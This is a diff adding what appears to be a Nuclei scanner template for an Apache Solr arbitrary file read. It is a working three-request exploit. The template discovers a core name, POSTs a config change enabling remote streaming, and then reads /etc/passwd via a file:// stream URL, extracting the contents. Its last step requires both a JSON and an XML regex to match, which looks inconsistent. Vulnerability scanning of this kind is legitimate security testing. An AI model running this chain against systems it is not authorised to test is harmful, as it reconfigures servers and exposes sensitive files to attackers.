@@ -1,0 +1,79 @@
+id: apache-solr-arbitrary-file-read
+
+info:
+  name: Apache Solr Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.
+  tags: fileread
+  reference:
+    - "https://solr.apache.org/"
+
+variables:
+  file: "/etc/passwd"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: check-core-name
+    method: GET
+    path:
+      - "{{BaseURL}}/solr/admin/cores?indexInfo=false&wt=json"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "responseHeader"
+    extractors:
+      - type: regex
+        internal: true
+        name: core_name
+        group: 1
+        regex:
+          - "\"name\":\"(.*?)\""
+
+  - id: enable-remote-streaming
+    method: POST
+    path:
+      - "{{BaseURL}}/solr/{{core_name}}/config"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "This response"
+
+  - id: read-file
+    method: POST
+    path:
+      - "{{BaseURL}}/solr/{{core_name}}/debug/dump?param=ContentStreams"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "stream.url=file://{{file}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?s)\"stream\":\"(.*)\"}]"
+      - type: regex
+        part: body
+        regex:
+          - "(?s)name=\"stream\">(.*?)</str>"
+    extractors:
+      - type: regex
+        name: file_content
+        group: 1
+        regex:
+          - "(?s)\"stream\":\"(.*)\"}]"
+          - "(?s)name=\"stream\">(.*?)</str>"
